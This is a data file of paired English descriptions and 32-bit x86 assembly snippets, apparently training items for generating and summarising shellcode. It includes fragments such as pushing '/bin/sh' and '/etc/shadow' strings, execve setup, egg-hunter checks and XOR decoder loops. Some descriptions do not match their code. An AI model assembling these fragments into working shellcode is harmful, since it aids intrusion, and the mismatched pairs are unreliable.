ShellCodeGen: subtract the byte 3 from the contents of the ebx register,"sub ebx, byte 3"
ShellCodeGen: move 30 to the cl register,"mov cl, 30"
"ShellCodeSum: mov byte [ebx + 35], al",move al into the byte at address [ebx + 35]
"ShellCodeSum: mov bh, 0xe2",move 0xe2 into bh
ShellCodeGen: move the byte in edi into the al register,"mov al, byte [edi]"
ShellCodeGen: move 5 into al,"mov al, 5"
"ShellCodeSum: and edx, 0000000fh",mask out lowest 4 bits of the edx register
ShellCodeGen: push the byte +0x7f onto the stack,push byte +0x7f
"ShellCodeSum: lea edx, [esi+47]",load the effective address of the result of the operation [esi+47] into the edx register
"ShellCodeSum: mov al, 0x01",move 0x01 into al
ShellCodeGen: move buff to eax,"mov eax, buff"
ShellCodeSum: next_addr:,declare the next_addr label
ShellCodeGen: define the doubleword variable real_number1 and initialize to 1234,real_number1 dd 1234
ShellCodeSum: push '//sh',push '//sh' onto the stack
ShellCodeSum: push dword 0x7665642f,push the dword 0x7665642f onto the stack
ShellCodeSum: _appendfile:,define the _appendfile label
"ShellCodeSum: add ebx, 24",add 48 to ebx
"ShellCodeSum: mov dl, byte 0ffh",move the byte at the address 0ffh into dl
"ShellCodeSum: test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6",if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
"ShellCodeSum: shr ebx, 1",divide ebx by 2 using right shift
"ShellCodeSum: add eax, edx",add the contents of edx to the contents of eax
"ShellCodeSum: push word 21 \n mov ebx, esp",push the word 21 onto the stack and point ebx to the stack register
ShellCodeGen: decrement the ecx register and jump to the bucle label if the counter is not zero,loop bucle
ShellCodeGen: restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit,"pop ecx \n loop l1 \n mov eax, 1"
"ShellCodeSum: mov dword [esp-0x4], eax",move the contents of the eax into the double word starting at the address [esp-0x4]
ShellCodeSum: call start,call the start function
ShellCodeGen: if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label,"cmp al, cl \n jne short decode \n jmp shellcode"
ShellCodeGen: move the contents at memory address z to edx,"mov edx, [z]"
ShellCodeGen: push 0x29 to the stack,push 0x29
ShellCodeGen: subtract 0x3217d6d2 from the contents in eax and save the result in eax,"sub eax, 0x3217d6d2"
ShellCodeSum: call one,call the one function
ShellCodeGen: move 2 into al,"mov al, 2"
"ShellCodeSum: mov word [esp+0x1], 0x776f",move 0x776f into the word in [esp+0x1]
"ShellCodeSum: test bl, bl \n jz not_found",if the contents of the bl register is not zero then jump to the label not_found
"ShellCodeSum: sub eax, eax",subtract the contents of eax from the contents of eax
ShellCodeGen: push the word ax onto the stack,push word ax
ShellCodeGen: move 0xe2 into bh,"mov bh, 0xe2"
ShellCodeSum: push word 0x7065,push the word 0x7065 onto the stack
ShellCodeGen: define the byte string 'my.txtx',db 'my.txtx'
"ShellCodeSum: add ebx, 0x2",add 0x2 to the contents in ebx and save the result in ebx
"ShellCodeSum: sub ebx, byte 3",subtract the byte 3 from the contents of the ebx register
"ShellCodeSum: mov eax, 29",make the system call to suspend the process
ShellCodeGen: decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register,"loop main_push \n mov cl, 30"
"ShellCodeSum: shl al, 4",left shift the contents of al by 4 bit positions
"ShellCodeSum: shr edx, 1",divide edx by 2 using right shift
"ShellCodeSum: mov al, exit_call",move exit_call into al
ShellCodeGen: push edi onto the stack,push edi
"ShellCodeSum: add ecx, 1",add the value 1 into the ecx register
ShellCodeSum: callpop:,define the callpop function
"ShellCodeSum: cmp ax, bx \n jne l3",if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label
ShellCodeGen: move the value 0x732f636f into the double word starting at the address [esp-0x24],"mov dword [esp-0x24], 0x732f636f"
"ShellCodeSum: mov eax, 19",go to file offset
ShellCodeSum: push dword 0x61722f6c,push the dword 0x61722f6c onto the stack
ShellCodeSum: priv_setuid:,declare the priv_setuid label
ShellCodeGen: load the effective address of the result of the operation [ecx+4] into the eax register,"lea eax, [ecx+4]"
ShellCodeGen: invoke subroutine bind,"mov ebx, 2"
ShellCodeSum: section .text,declare section containing code
ShellCodeSum: jmp short cycle,jump short to cycle label
ShellCodeGen: define the _shell label,_shell:
ShellCodeGen: put ASCII /bin/sh into eax,"push 0x68732f2f \n push 0x6e69622f \n mov eax, esp"
ShellCodeGen: push 0x68732f6e onto the stack,push 0x68732f6e
ShellCodeSum: push dword 0x73656c62,push the dword 0x73656c62 onto the stack
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov edi, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
ShellCodeGen: push 216 value to the stack,push 216
ShellCodeGen: define key constant equal to 0xdeadbeef,key equ 0xdeadbeef
ShellCodeGen: push the word 100 onto the stack,push word 100
ShellCodeGen: load the value of ebx+0xff into register ecx,"lea ecx, [ebx+0xff]"
ShellCodeGen: move the contents at memory address y to eax,"mov eax, [y]"
ShellCodeGen: place the value ebx+4*esi in edi,"lea edi, [ebx+4*esi]"
ShellCodeSum: push 0x6e7a762d,push 0x6e7a762d onto the stack
ShellCodeSum: next_cycle:,declare the next_cycle label
ShellCodeGen: push 0x7372656f to the stack,push 0x7372656f
ShellCodeSum: jmp short four,jump short to the four label
ShellCodeGen: move 12 into al,"mov al, 12"
ShellCodeGen: declare of the global _star,global _star
ShellCodeGen: jump to _read,jmp _read
ShellCodeGen: system call interrupt 0x80,int 0x80
ShellCodeGen: jump to next_addr if not zero,jnz next_addr
ShellCodeGen: mutliply eax by ecx,mul ecx
ShellCodeGen: right rotate the contents of the esi register by 1 bit,"ror esi, 1"
ShellCodeGen: execve system call number 11,"mov al, 0xb"
ShellCodeGen: push the word 0x632d onto the stack and point the eax register to the stack register,"push word 0x632d \n mov eax, esp"
ShellCodeSum: push 0x742f3a31,push 0x742f3a31 onto the stack
ShellCodeGen: left shift the contents of eax register by 28 bit positions,"shl eax, 28"
"ShellCodeSum: xor edx, edx \n cmp ecx, edx \n je l2",zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register
"ShellCodeSum: cmp dx, 00",compare the dx value with zero
"ShellCodeSum: xor eax, eax",set the eax register to null
ShellCodeGen: exit,"mov eax, 1"
ShellCodeGen: move al into the byte at address [esi+14],"mov byte [esi+14], al"
ShellCodeGen: push 0x6e69622f onto the stack,push 0x6e69622f
ShellCodeGen: if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register,"cmp dword [eax-4], egg1 \n jne _next \n jmp eax"
"ShellCodeSum: add eax, 0x31179798",add 0x31179798 to the contents in eax and save the result in eax
"ShellCodeSum: mov ebx, m_src2",move m_src2 to ebx
ShellCodeGen: jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label,"cmp BYTE al, 2 \n je do_inject \n jmp while"
"ShellCodeSum: mov al, 0x3",move 0x3 into al
ShellCodeGen: load the effective address of the operation [ebx+0xb] into the eax register,"lea eax,[ebx+0xb]"
"ShellCodeSum: lea ebx, [zero_reg+3]",load the effective address [zero_reg+3] into ebx
ShellCodeSum: push byte 0x2,push the byte 0x2 onto the stack
ShellCodeGen: add decimal 48 to eax,"add eax, 48"
ShellCodeSum: push 0x4c4c4128,push the 0x4c4c4128 onto the stack
ShellCodeSum: push dword 0x64777373,push the dword 0x64777373 onto the stack
ShellCodeGen: push /bin/sh onto the stack and point the eax register to the stack register,"push 0x68732f2f \n push 0x6e69622f \n mov eax, esp"
ShellCodeGen: jump to the label l1 if the contents of the eax register is not zero,"test eax, eax \n jnz l1"
ShellCodeSum: jnz next_cycle,if not zero jump to the next_cycle label
ShellCodeGen: move the byte in eax into dl,"mov dl, byte [eax]"
ShellCodeSum: jne short _while_loop,if not equal jump short to the _while_loop
ShellCodeGen: zero out eax and edx,"xor edx, edx \n mul edx"
ShellCodeSum: inc edi,increment edi
"ShellCodeSum: xor edx, edx \n mul edx",zero out the eax and edx register
ShellCodeSum: realarray resq 10,reserve array realarray of 10 real numbers
"ShellCodeSum: cmp BYTE [edx], 0x2e \n jne l2",if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e then jump to the l2 label
"ShellCodeSum: cmp edx, 42",compare the contents of edx to 42
ShellCodeGen: move the byte at the address 0bh into al,"mov al, byte 0bh"
ShellCodeSum: _load_data:,define the _load_data label
ShellCodeGen: write to the file,"mov eax, 4"
ShellCodeSum: call code,call the code function
"ShellCodeSum: shr ecx, 2",divide ecx by 4 using right shift
"ShellCodeSum: mov dword [esi + 12], eax",move eax into the dword at address [esi + 12]
ShellCodeGen: jump short to the decode_pr label,jmp short decode_pr
"ShellCodeSum: mov [edi], al",move the contents of the al register into the edi register
ShellCodeGen: decrement the cl register by one,dec cl
ShellCodeGen: push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register,"push 0x61702f2f \n push 0x6374652f \n mov ebx, esp"
ShellCodeSum: negative:,define negative label
ShellCodeGen: restore ecx from the value we pushed onto the stack at the start,pop ecx
"ShellCodeSum: lea eax, [zero_reg+3]",load the effective address [zero_reg+3] into eax
ShellCodeGen: decrement the counter and jump to .3 label if the count is not zero,loop .3
ShellCodeGen: define the _exec label,_exec:
ShellCodeGen: push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov eax, esp"
ShellCodeGen: if not 0 then jump to the scan label,jnz scan
ShellCodeGen: zero out eax and ecx,"xor ecx, ecx \n mul ecx"
ShellCodeGen: add 0x21354523 to the contents in esi and save the result in esi,"add esi, 0x21354523"
ShellCodeGen: add 2 to the contents of the eax register,"add eax, 2"
"ShellCodeSum: mov byte [edx+ecx],al",move al into the single byte at the address stored in edx+ecx
ShellCodeSum: push byte 4 \n pop eax,put the syscall 4 into the eax register
"ShellCodeSum: mov ecx, 36",get 36 in the ecx
ShellCodeGen: push the byte 0x2e onto the stack,push byte 0x2e
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov eax, esp",put ASCII /bin/sh into eax
ShellCodeGen: push 0x1a to the stack,push 0x1a
"ShellCodeSum: mov ecx, 0x88998899",move 0x88998899 into ecx
"ShellCodeSum: cmp BYTE al, 2 \n je do_inject",jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
ShellCodeGen: push 0x68736162 to the stack,push 0x68736162
ShellCodeGen: push 0x3a30754a onto the stack,push 0x3a30754a
"ShellCodeSum: xchg eax, ebx",exchange eax with ebx
ShellCodeGen: jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register,"cmp eax, ebx \n je 0x47 \n xor ecx, ecx"
"ShellCodeSum: loop l1 \n mov eax, esp",decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
ShellCodeGen: call jmp_search,call jmp_search
ShellCodeGen: set the direction flag to zero,cld
ShellCodeSum: duploop:,declare the duploop label
ShellCodeGen: right shift the contents of the edx register by the byte 16,"shr edx, byte 16"
ShellCodeSum: push 0x6962732f,push 0x6962732f onto the stack
ShellCodeGen: clear the ax register,"xor ax, ax"
ShellCodeGen: move ecx into esi,"mov esi, ecx"
"ShellCodeSum: test eax, eax \n jz short loc_402C13",if the contents of the eax register is zero then jump short to the memory location loc_402C13
ShellCodeGen: push the 0x69622f2f onto the stack,push 0x69622f2f
ShellCodeGen: move byte 1 onto stack,push byte 1
ShellCodeGen: push the word 0x662d onto the stack and point the edi register to the stack register,"push word 0x662d \n mov edi, esp"
ShellCodeGen: decrement the contents of the cl register,dec cl
ShellCodeGen: declare the done label,done:
"ShellCodeSum: xor eax, esi",perform a logical xor between the eax register and the esi register and save the result in eax
ShellCodeGen: move 884021143 into edi,"mov edi, 884021143"
ShellCodeGen: move 2001 into cx,"mov cx, 2001"
ShellCodeGen: add memory[di + 20] to ax,"add ax, [di + 20]"
ShellCodeSum: reading:,declare the reading label
ShellCodeSum: _parent_read:,define the _parent_read label
ShellCodeSum: jmp short _execline,jump short to the _execline label
ShellCodeSum: push byte 0x17 \n pop eax,put the syscall 0x17 into the eax register
ShellCodeGen: push the byte 2 onto the stack,push byte 2
ShellCodeSum: push 0x7369642d,push 0x7369642d to the stack
ShellCodeGen: reset eax,"xor eax, eax"
ShellCodeGen: make room for one 4-byte local variable,"sub esp, 4"
"ShellCodeSum: mov eax, edx",move edx into eax
ShellCodeSum: pop eax,pop the value on the stack back into eax
ShellCodeGen: push 0x5000 onto stack port,push word 0x5000
"ShellCodeSum: mov edx, [esp]",move the contents of the esp register into the edx register
ShellCodeGen: add 0x21354523 to the contents of esi,"add esi, 0x21354523"
ShellCodeGen: restore the top of the stack into the ebx register,pop ebx
ShellCodeGen: define decoded_shellcode function,decoded_shellcode:
ShellCodeSum: writestring:,declare the writestring label
ShellCodeGen: perform the xor operation between the byte starting at the addess in esi and the value 0x2c,"xor byte [esi], 0x2c"
ShellCodeSum: push dword 0x6374652f,push the dword 0x6374652f onto the stack
ShellCodeSum: push word 0x5c11,push the word 0x5c11 to the stack
"ShellCodeSum: mov edi, 0x978cd0d0",move 0x978cd0d0 into edi
ShellCodeGen: declare the three label,three:
ShellCodeGen: exchange ecx with edx,"xchg ecx, edx"
ShellCodeSum: push 0x68732f6e,push 0x68732f6e to the stack
ShellCodeGen: put the byte my_value into the eax register,push byte my_value \n pop eax
"ShellCodeSum: mov eax, 11",load and run the program
ShellCodeGen: declare section bss,section .bss
"ShellCodeSum: sub esp, 4",make room on the stack for local variable
ShellCodeGen: compare the byte at the memory location ebp+ecx with 61h,"cmp byte [ebp+ecx], 61h"
"ShellCodeSum: cmp dl, 27 \n jg l3",jump to the label l3 if the contents of the dl register is greater than the decimal value 27
ShellCodeGen: call the atoi function,call atoi
ShellCodeGen: subtract 12 from the contents of the esp register,"sub esp, 12"
ShellCodeGen: add 20 to the single byte stored at memory address var,"add byte [var], 20"
ShellCodeGen: push the 0x3905 onto the stack,pushw 0x3905
"ShellCodeSum: mov eax, 37",make the system call to send the signal to another process
"ShellCodeSum: mov edx, 43",move decimal 43 into edx
ShellCodeSum: call strlen,call the strlen function
ShellCodeSum: google db '127.1.1.1 google.com',define google as the byte string '127.1.1.1 google.com'
ShellCodeGen: jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9,"cmp al, 9 \n jge l1"
"ShellCodeSum: mov eax, 5",invoke sys_open
ShellCodeSum: dec esp,decrement the esp register by one
ShellCodeGen: jump short to the callit label,jmp short callit
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov ebx, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeSum: number dw 12345,define number variable of a word and initialize to 12345
ShellCodeSum: process_shellcode:,declare the process_shellcode label
ShellCodeGen: jump to eax,jmp eax
"ShellCodeSum: push 0x64687373 \n mov ebx, esp",push the value 0x64687373 onto the stack and point the ebx register to the stack register
ShellCodeGen: move the remainder into eax,"mov eax, edx"
ShellCodeGen: move 0x2e323931 into eax,"mov eax, 0x2e323931"
ShellCodeGen: jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7,"cmp BYTE [esi], 0x7 \n jle lowbound"
ShellCodeGen: jump short to encodedshellcode if equal,je short encodedshellcode
"ShellCodeSum: mov [bp+0x3a], bx",move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
ShellCodeGen: move the byte at the address [edi] into bl,"mov bl, byte [edi]"
ShellCodeGen: clear all but the last 4 bits of eax,"and eax, 0fh"
ShellCodeGen: jump to the loop label if the contents of the cl register is not equal to the value 0x3,"cmp cl, 0x3 \n jne loop"
"ShellCodeSum: test eax, eax \n js short socket",if the contents of the eax register is negative then jump short to the label socket
"ShellCodeSum: mov dword [esp-0x28], 0x72702f2f",move the value 0x72702f2f into the double word starting at the address [esp-0x28]
ShellCodeGen: push the dword 0x58494741 onto the stack,push dword 0x58494741
ShellCodeGen: move 0xdeadc0de into eax,"mov eax, 0xdeadc0de"
ShellCodeGen: move eax into ebx+12,"mov [ebx+12], eax"
ShellCodeGen: make the system call signal,"mov eax, 48"
"ShellCodeSum: mov dword [eax], var1",copy the value in var1 into the doubleword starting at the address in eax
ShellCodeSum: decoder:,define decoder function
ShellCodeSum: jz encoded,jump to the encoded label if the zero flag is set
ShellCodeGen: push 0x752f2f2f onto the stack,push 0x752f2f2f
ShellCodeGen: declare a byte contining 0x68,db 0x68
ShellCodeGen: move the value 0x5 into the al register,"mov al, 0x5"
ShellCodeGen: push the word 0x1ff onto the stack,push word 0x1ff
ShellCodeGen: make the system call pause,"mov eax, 29"
"ShellCodeSum: add byte [var], 20",add 20 to the single byte stored at memory address var
ShellCodeSum: dec cl \n jns dup2,decrement the contents of the cl register and jump to the dup2 label if the result is not negative
ShellCodeGen: if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register,"cmp eax, eax \n jne 0x8 \n xor eax, eax"
ShellCodeGen: push the byte +0x1 onto the stack,push byte +0x1
ShellCodeSum: je all,jump to the all label if the operands of the above comparison are equals
ShellCodeSum: cdq,extend the sign bit of the eax register into the edx register
ShellCodeSum: push esp,push esp to the stack
ShellCodeGen: perform a bit-wise inversion of the byte starting at the address in esi,not byte [esi]
ShellCodeGen: make the system call getpgrp,"mov eax, 65"
ShellCodeGen: move msg1 string into eax,"mov eax, msg1"
ShellCodeGen: initialize ecx to zero,"xor ecx, ecx"
ShellCodeGen: place the address of var in eax,"lea eax, [var]"
ShellCodeGen: push the value 0x30 onto the stack,push 0x30
ShellCodeGen: move hellolen into edx,"mov edx, hellolen"
ShellCodeGen: move 0x68732f2f into the dword at address [esp-8],"mov dword [esp-8], 0x68732f2f"
ShellCodeGen: decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register,"loop main_inc \n mov ebx, esp"
ShellCodeGen: make sys_exit kernel call,int 80h
ShellCodeGen: left shift the contents of eax 16 bits,"shl eax, 16"
ShellCodeSum: push 0x31373737,push the 0x31373737 onto the stack
"ShellCodeSum: test eax, eax \n jz short loc_402B13",if the contents of the eax register is zero then jump short to the memory location loc_402B13
"ShellCodeSum: add eax, 10",add 10 to eax
ShellCodeGen: move 4 into bl,"mov bl, 4"
ShellCodeGen: put the syscall 17h into the eax register,push byte 17h \n pop eax
ShellCodeGen: push the word bx to the stack,push word bx
ShellCodeGen: put the syscall 0x10 into the eax register,push byte 0x10 \n pop eax
ShellCodeSum: db 0x80,declare a byte and initialize it to 0x80
"ShellCodeSum: push 0x68732f2f \n push 0x6e69622f \n mov edx, esp",move /bin/sh into the edx register
ShellCodeGen: perform a xor operation between ax and 0x539 and save the result in ax,"xor ax, 0x539"
"ShellCodeSum: lea eax,[ebx+0xb]",load the effective address of the operation [ebx+0xb] into the eax register
ShellCodeSum: call main,call the main function
ShellCodeGen: move exit_call into al,"mov al, exit_call"
ShellCodeGen: put the syscall 0x1c into the eax register,push byte 0x1c \n pop eax
"ShellCodeSum: add al, 2",add the value 2 to the contents of the al register
ShellCodeGen: subtract the contents of al register from the contents of bl register and save the result in bl,"sub bl, al"
"ShellCodeSum: push esi \n mov ebx, esp",push the contents of the esi register onto the stack and point ebx to the stack register
"ShellCodeSum: mov ax, bx",move the contents of bx into ax
ShellCodeGen: define fupdisasm label,fupdisasm:
ShellCodeGen: load the effective address [esi+4] into esi,"lea esi, [esi+4]"
ShellCodeSum: pop edx,restore the top of the stack into the edx register
ShellCodeGen: put /bin/sh into ecx,"push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp"
ShellCodeSum: jns duploop,jump to the duploop label if the previous instruction clears the sign flag
ShellCodeGen: move the byte 0bh into al,"mov al, byte 0bh"
"ShellCodeSum: mov bl, 0x7",move 0x7 into bl
"ShellCodeSum: mov al, 2",move 2 into al
"ShellCodeSum: mov ecx, [my_table]",move effective address of my_table in ecx
ShellCodeSum: push 0x203a4457,push the 0x203a4457 onto the stack
ShellCodeGen: execute execve syscall,int 0x80
ShellCodeGen: push double word 0x74652f2f onto the stack and point the esi register to the stack register,"push dword 0x74652f2f \n mov esi, esp"
ShellCodeGen: move 0x2f into the byte in esp,"mov byte [esp], 0x2f"
ShellCodeSum: push ebp,save the old base pointer value
ShellCodeGen: signal,"mov eax, 48"
"ShellCodeSum: mov dword [esp-4], esi",move esi into the doubleword starting at the address esp-4
"ShellCodeSum: mov eax, 65",system call getpgrp
ShellCodeSum: wordvar: resw 1,reserve a word for wordvar
ShellCodeSum: jnz short decode,jump short to the decode label if the zero flag is cleared
ShellCodeSum: decode:,define decode label
"ShellCodeSum: push word 0x662d \n mov ecx, esp",push the word 0x662d onto the stack and point the ecx register to the stack register
ShellCodeGen: move 1666 into bx,"mov bx, 1666"
ShellCodeGen: move the address of the stack pointer into ecx,"mov ecx, esp"
"ShellCodeSum: mov dword [esp-0x10], 0x5f657a69",move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
ShellCodeGen: push the contents of the eax register onto the stack and point ebx to the stack register,"push eax \n mov ebx, esp"
ShellCodeGen: push 0x2e323931 to the stack,push 0x2e323931
"ShellCodeSum: mov eax, 4",make the system call write
ShellCodeSum: push 0xf,push 0xf onto the stack
ShellCodeGen: push 0x6475732f onto the stack,push 0x6475732f
"ShellCodeSum: cmp eax, 0",compare if eax is equal to 0
ShellCodeGen: declare the len label equal to the length of shellcode,len: equ $-shellcode
"ShellCodeSum: cmp eax, ebx \n je 0x47 \n xor ecx, ecx",jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
ShellCodeGen: push 0xa onto the stack,push 0xa
"ShellCodeSum: mov ebx, [y]",move the contents at memory address y to ebx
ShellCodeGen: jump to download if zero,jz download
ShellCodeGen: if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label,"cmp dword [eax-8], egg \n jne _next"
"ShellCodeSum: mov [bp+0x31], al",move the contents of the al register at the memory location specified by the operation [bp+0x31]]
ShellCodeGen: push 0x3131313a onto the stack,push 0x3131313a
ShellCodeSum: popad,move doublewords from the stack into the 32 bit registers
ShellCodeGen: move the value 0x656e7265 into the double word starting at the address [esp-0x1c],"mov dword [esp-0x1c], 0x656e7265"
ShellCodeGen: divide eax by ebx,div ebx
"ShellCodeSum: mov edx, environment",move the address of environment variable into edx
ShellCodeSum: jl _while_loop,jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
ShellCodeSum: jne checkint,if the remainder is not equal to zero jump to local label checkint
"ShellCodeSum: test dl, 0x1 \n jnz ready_to_proxy",if the contents of the dl register is not zero then jump to the label ready_to_proxy
"ShellCodeSum: mov al, 0x0a",move 0x0a into al
ShellCodeGen: push the word 0x662d onto the stack and point the eax register to the stack register,"push word 0x662d \n mov eax, esp"
ShellCodeGen: push the dword 0x61722f6c onto the stack,push dword 0x61722f6c
ShellCodeGen: push 0x2e323931 onto the stack,push 0x2e323931
ShellCodeGen: define the all label,all:
ShellCodeSum: push 'sswd',push 'sswd' onto the stack
ShellCodeGen: add ecx to ebx,"add ebx, ecx"
ShellCodeSum: dec ecx \n jns 2f_loop,decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative
ShellCodeGen: move 128 into cl,"mov cl, 128"
"ShellCodeSum: mov ebp, buff",place address of buffer into ebp
ShellCodeGen: load the effective address of the result of the operation [ebp+20] into the esi register,"lea esi, [ebp+20]"
"ShellCodeSum: cmp dword [var], 10",compare the doubleword stored at memory location var to the integer value 10
ShellCodeGen: define shellcodelen equal to the length of shellcode,shellcodelen equ $-shellcode
"ShellCodeSum: push 0x6873732f \n push 0x6374652f \n mov eax, esp",push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
ShellCodeGen: jump to next_page if zero,jz next_page
ShellCodeGen: declare the text section,section .text
ShellCodeGen: subtract 0x13 from the al register,"sub al,0x13"
"ShellCodeSum: xor eax, eax",set eax to 0
ShellCodeGen: move the value 0x6d6f646e into the double word starting at the address [esp-0x14],"mov dword [esp-0x14], 0x6d6f646e"
ShellCodeGen: push 0x6168732f onto the stack,push 0x6168732f
"ShellCodeSum: mov eax, [esi-4]",move 4 bytes at memory address esi-4 into eax
ShellCodeSum: push 0x50446862,push 0x50446862 onto the stack
ShellCodeGen: perform a bit-wise inversion of edx,not edx
"ShellCodeSum: cmp DWORD [eax], edx \n jne search_the_egg \n jmp eax",if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
ShellCodeGen: multiply edx by 4 using left shift,"shl edx, 2"
ShellCodeGen: push the contents of the edx register onto the stack and point ebx to the stack register,"push edx \n mov ebx, esp"
"ShellCodeSum: ror esi, 1",right rotate esi 1 time
ShellCodeGen: if the contents of the eax register is not zero then jump to the label l4 else call the function search,"test eax, eax \n jnz l4 \n call search"
"ShellCodeSum: contents db 'hello world!', 0h",define a string db and initialize to 'hello world!'
ShellCodeGen: jump short to the todo label,jmp short todo
ShellCodeGen: push 0x68736164 to the stack,push 0x68736164
ShellCodeGen: move 10 into esi,"mov esi, 10"
"ShellCodeSum: mov ecx, array",move the first element of array into ecx
ShellCodeGen: compare the value in the eax register to the doubleword addressed by the edi register,scasd
ShellCodeSum: push 0x6f723a30,push 0x6f723a30 onto the stack
"ShellCodeSum: mov edi, esp",move esp into edi
ShellCodeGen: initialize edx with the hexadecimal value 0x0,"xor edx, edx"
ShellCodeGen: negate all the bits of the ax register,not ax
"ShellCodeSum: mov al, 04h",move 04h into al
ShellCodeSum: mul 25,multiply the contents of eax by 25
ShellCodeSum: cdq,extend the sign bit of eax into the edx register
ShellCodeSum: push byte 0x10,push the byte 0x10 onto the stack
ShellCodeGen: define the _exit label,_exit:
ShellCodeGen: push the byte 0xb onto the stack,push byte 0xb
"ShellCodeSum: mov al, a_letter",move data at memory location a_letter into al
"ShellCodeSum: sub ecx, 0x0b454440",subtract 0x0b454440 from the contents in ecx and save the result in ecx
ShellCodeGen: increment ebx,inc ebx
ShellCodeGen: move esp into ebp,"mov ebp, esp"
"ShellCodeSum: mov bx, 20",move the value 20 into bx
ShellCodeGen: load the effective address [ebp+24] into ebx,"lea ebx, [ebp+24]"
ShellCodeGen: move 0x0a into al,"mov al, 0x0a"
ShellCodeGen: move the 4 bytes of data at address esi+4*eax into ecx,"mov ecx, [esi+4*eax]"
ShellCodeSum: push 0x66,push the 0x66 onto the stack
ShellCodeGen: compare the contents at memory location esi and the contents of the edx register,"cmp [esi], edx"
ShellCodeSum: push word 100,push the word 100 onto the stack
ShellCodeGen: push zero_reg onto the stack,push zero_reg
ShellCodeGen: push the byte 0x1 to the stack,push byte 0x1
ShellCodeSum: push byte 0x10 \n pop eax,put the syscall 0x10 into the eax register
ShellCodeGen: perform the xor operation between the value stored at the location ecx and bh,"xor [ecx], bh"
"ShellCodeSum: mov ebx, dword 0x5090508f",move dword 0x5090508f into ebx
ShellCodeGen: decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register,"loop l3 \n mov ecx, esp"
ShellCodeSum: push 0x2,push 0x2 to the stack
"ShellCodeSum: mov eax, 27",make the system call alarm
"ShellCodeSum: mov dh, 0xff",move 0xff into dh
ShellCodeGen: move 0bh into bl,"mov bl, 0bh"
"ShellCodeSum: mov ecx, array2",move the first element in array2 into ecx
"ShellCodeSum: sub eax, 0x0efc3532",subtract 0x0efc3532 from the contents in eax and save the result in eax
ShellCodeGen: decrement ebx,dec ebx
ShellCodeGen: multiply eax by 0x10 and stores the result in edx:eax,mul 0x10
ShellCodeGen: declare the end label,end:
ShellCodeSum: 3:,define the numeric label 3
ShellCodeGen: make the system call for write,"mov eax, 4"
ShellCodeSum: push 0x2,push the 0x2 onto the stack
ShellCodeGen: push the word 2 onto the stack,push word 2
ShellCodeGen: if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register,"cmp al, 0xaa \n je decode_insertion \n xor al, bl"
ShellCodeGen: ecx point to the top of the stack,"mov ecx, esp"
ShellCodeGen: push the byte 0x04 onto the stack,push byte 0x04
"ShellCodeSum: mov ebx, 3",move decimal number 3 into ebx
ShellCodeSum: decoder:,define decoder label
ShellCodeGen: define set_argv label,set_argv:
ShellCodeGen: subtract 0x3bd04ede from the contents in eax and save the result in eax,"sub eax, 0x3bd04ede"
ShellCodeGen: push 2 onto the stack,push 2
ShellCodeGen: move edx into ecx,"mov ecx, edx"
ShellCodeGen: jump to connect if equal,je connec
"ShellCodeSum: sub al, 0x41",subtract 0x41 from the al register
"ShellCodeSum: mov al, 0x1",move the value 0x1 into the al register
ShellCodeGen: push 0x7369642d to the stack,push 0x7369642d
ShellCodeSum: jmp eax,jump to eax
ShellCodeSum: pop esi,pop the top of the stack into the esi register
"ShellCodeSum: xor edx, edx",clear edx register
ShellCodeGen: add 10 to the variable marks,"add marks, 10"
ShellCodeSum: next_addr:,declare next_addr function
ShellCodeGen: send signal to another process,"mov eax, 37"
ShellCodeSum: push dword 0x6962732f,push the dword 0x6962732f onto the stack
ShellCodeGen: push 0x3170762d to the stack,push 0x3170762d
"ShellCodeSum: mov eax, 1",make the system call exit
ShellCodeGen: swap the values of edx and ebx registers,"xchg edx, ebx"
ShellCodeSum: jmp _start,jump to the _start label
ShellCodeGen: reserve a word for wordvar,wordvar: resw 1
ShellCodeGen: push the word 0x632d onto the stack and point the esi register to the stack register,"push word 0x632d \n mov esi, esp"
"ShellCodeSum: rol byte [esi], 0x2",left rotate the byte in esi 2 times
ShellCodeSum: nop,no operation
ShellCodeSum: call jmp_search,call jmp_search
ShellCodeGen: declare section text,section .text
ShellCodeGen: push the 0x6 value onto the stack,push 0x6
